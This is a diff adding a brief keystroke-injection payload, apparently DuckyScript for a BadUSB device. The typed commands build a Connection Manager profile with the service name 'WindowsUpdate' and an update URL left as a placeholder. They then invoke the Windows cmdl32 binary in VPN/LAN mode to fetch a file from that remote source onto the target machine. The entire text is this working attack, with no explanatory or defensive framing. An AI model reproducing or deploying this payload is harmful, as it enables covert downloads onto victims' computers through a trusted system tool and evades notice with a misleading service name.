@@ -1,0 +1,9 @@
+STRINGLN echo "[Connection Manager]" > config
+STRINGLN echo "CMSFile=config" >> config
+STRINGLN echo "ServiceName=WindowsUpdate" >> config
+STRINGLN echo "TunnelFile=config" >> config
+STRINGLN echo "[Settings]" >> config
+STRINGLN echo "UpdateUrl=![$DS_SOURCE]" >> config
+
+
+STRINGLN cmdl32 /vpn /lan %cd%\config
